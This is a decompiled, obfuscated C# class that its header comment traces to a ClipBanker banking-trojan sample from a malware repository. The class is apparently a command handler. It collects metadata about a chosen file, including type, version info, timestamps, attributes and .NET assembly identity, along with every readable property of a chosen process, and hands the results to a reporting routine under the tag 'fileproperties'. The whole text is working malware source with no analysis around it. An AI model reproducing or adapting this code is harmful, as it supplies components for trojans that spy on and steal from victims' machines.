// Decompiled with JetBrains decompiler
// Type: jtw.36M
// Assembly: uc5uTlQKZwvBJeUwoIoxWYL1o3uBI8gaMfnT9AO, Version=9.8.6.0, Culture=neutral, PublicKeyToken=null
// MVID: 66B519F9-803D-46C9-8343-EC24850CA08A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-de0d24df79f99286da0234aa1536470d7596c53e531173d693d6ccc60b98e84c.exe

using \u0032K4;
using crD;
using H16;
using I71;
using l6z;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

namespace jtw
{
  internal sealed class \u00336M : x77
  {
    private readonly string \u0037G1;
    private readonly int c18;

    [SpecialName]
    public string gv7() => this.\u0037G1;

    [SpecialName]
    public int \u0033II() => this.c18;

    public \u00336M(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2,
      [In] string obj3,
      [In] string obj4,
      [In] string obj5)
    {
      try
      {
        Dictionary<string, string> dictionary1 = obj1.dtU<Dictionary<string, string>>();
        Dictionary<string, Dictionary<string, string>> dictionary2 = new Dictionary<string, Dictionary<string, string>>()
        {
          {
            "General",
            new Dictionary<string, string>()
          },
          {
            "Details",
            new Dictionary<string, string>()
          },
          {
            "NETAssembly",
            new Dictionary<string, string>()
          },
          {
            "Process",
            new Dictionary<string, string>()
          }
        };
        if (File.Exists(dictionary1["Path"]))
        {
          dictionary2["General"]["Description"] = Path.GetFileName(dictionary1["Path"]);
          dictionary2["General"]["Type"] = "File";
          try
          {
            byte[] numArray = new byte[2];
            using (FileStream fileStream = File.Open(dictionary1["Path"], FileMode.Open))
              fileStream.Read(numArray, 0, 2);
            dictionary2["General"]["Type"] = Encoding.UTF8.GetString(numArray) == "MZ" ? "Executable" : "File";
          }
          catch
          {
            dictionary2["General"]["Type"] = Path.GetExtension(dictionary1["Path"]) == ".exe" ? "Executable" : "File";
          }
          try
          {
            FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(dictionary1["Path"]);
            if (versionInfo.FileDescription != null && !string.IsNullOrWhiteSpace(versionInfo.FileDescription))
              dictionary2["General"]["Description"] = versionInfo.FileDescription;
            foreach (PropertyInfo property in typeof (FileVersionInfo).GetProperties())
            {
              try
              {
                object obj = property.GetValue((object) versionInfo, (object[]) null);
                if (obj != null && (property.PropertyType != typeof (string) || !string.IsNullOrEmpty((string) obj)) && !property.Name.EndsWith("Part") && (property.PropertyType != typeof (bool) || (bool) obj))
                {
                  string str = !(obj is DateTime dateTime) ? obj.ToString() : dateTime.ToUniversalTime().ToString((IFormatProvider) CultureInfo.InvariantCulture);
                  dictionary2["Details"][property.Name] = str;
                }
              }
              catch
              {
              }
            }
          }
          catch
          {
          }
          try
          {
            FileInfo fileInfo = new FileInfo(dictionary1["Path"]);
            dictionary2["General"]["Size"] = xY7.c36(fileInfo.Length);
            dictionary2["General"]["Location"] = fileInfo.FullName;
            Dictionary<string, string> dictionary3 = dictionary2["General"];
            DateTime dateTime = fileInfo.CreationTime;
            dateTime = dateTime.ToUniversalTime();
            string str = dateTime.ToString((IFormatProvider) CultureInfo.InvariantCulture);
            dictionary3["Created"] = str;
            dictionary2["General"]["Modified"] = fileInfo.LastWriteTime.ToUniversalTime().ToString((IFormatProvider) CultureInfo.InvariantCulture);
            dictionary2["General"]["Accessed"] = fileInfo.LastAccessTime.ToUniversalTime().ToString((IFormatProvider) CultureInfo.InvariantCulture);
            dictionary2["General"]["ReadOnly"] = fileInfo.Attributes.HasFlag((Enum) FileAttributes.ReadOnly) ? "Y" : "N";
            dictionary2["General"]["Hidden"] = fileInfo.Attributes.HasFlag((Enum) FileAttributes.Hidden) ? "Y" : "N";
            dictionary2["General"]["System"] = fileInfo.Attributes.HasFlag((Enum) FileAttributes.System) ? "Y" : "N";
            dictionary2["General"]["Archive"] = fileInfo.Attributes.HasFlag((Enum) FileAttributes.Archive) ? "Y" : "N";
          }
          catch
          {
          }
          try
          {
            dictionary2["NETAssembly"]["IsAssembly"] = "False";
            if (dictionary2["General"]["Type"] == "Executable")
            {
              AssemblyName assemblyName = AssemblyName.GetAssemblyName(dictionary1["Path"]);
              dictionary2["NETAssembly"]["IsAssembly"] = "True";
              dictionary2["NETAssembly"]["Name"] = assemblyName.FullName;
              dictionary2["NETAssembly"]["Version"] = assemblyName.Version.ToString();
            }
          }
          catch
          {
          }
        }
        if (!string.IsNullOrWhiteSpace(dictionary1["PID"]))
        {
          try
          {
            Process processById = Process.GetProcessById(Convert.ToInt32(dictionary1["PID"]));
            foreach (PropertyInfo property in typeof (Process).GetProperties())
            {
              try
              {
                object obj = property.GetValue((object) processById, (object[]) null);
                if (obj != null && (property.PropertyType != typeof (string) || !string.IsNullOrEmpty((string) obj)) && property.Name != "SafeHandle" && property.Name != "StartInfo" && (property.PropertyType != typeof (bool) || (bool) obj))
                {
                  string str = !(obj is DateTime dateTime) ? (!(obj is ICollection collection) ? obj.ToString() : collection.Count.ToString()) : dateTime.ToUniversalTime().ToString((IFormatProvider) CultureInfo.InvariantCulture);
                  dictionary2["Process"][property.Name] = str;
                }
              }
              catch
              {
              }
            }
          }
          catch
          {
          }
        }
        g79.F77(obj0, "fileproperties", dictionary2.LE3(), obj2, obj3, obj4, obj5);
        this.c18 = 0;
      }
      catch (Exception ex)
      {
        this.\u0037G1 = ex.Message;
        this.c18 = 1;
      }
    }
  }
}
